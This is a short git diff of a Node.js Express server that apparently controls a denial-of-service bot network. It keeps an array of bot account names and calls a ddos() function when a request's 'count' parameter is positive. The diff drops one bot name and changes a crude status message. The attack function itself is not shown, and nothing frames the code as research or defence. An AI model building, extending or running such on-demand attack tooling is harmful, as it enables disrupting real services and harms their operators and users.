@@ -5,7 +5,7 @@ const port=process.env.PORT || 8021;
 const app=express();
 const server=http.createServer(app)
 const listener=server.listen(port,hostname,()=>{console.log("Server spinned up on port "+listener.address().port)});
-const botArray=["tatras4","tatras5","tatras6","tatras7","tatras8","tatras9","tatras10","tatras11","tatras12","tatras13","fadros","fedros","pytras","accalia","admetus","felixsa","ethanio","caspas","thorax","thoru","fagona","fagrus","cypruss","gapris","tikana","takris","fadnavis","crocasa","rasmon","rassas","dasnoma","dhanisa"]
+const botArray=["tatras4","tatras5","tatras6","tatras7","tatras8","tatras9","tatras10","tatras11","tatras12","tatras13","fadros","fedros","pytras","accalia","admetus","ethanio","caspas","thorax","thoru","fagona","fagrus","cypruss","gapris","tikana","takris","fadnavis","crocasa","rasmon","rassas","dasnoma","dhanisa"]
 app.get("/",(req,res,next)=>{
 if(parseInt(req.query.count)>0){
   const count=req.query.count
@@ -17,7 +17,7 @@ ddos(null)
 }}
 
 console.log(req.query)
-res.send("fuckery starts")
+res.send("fuckery begins")
 
 res.end()
 
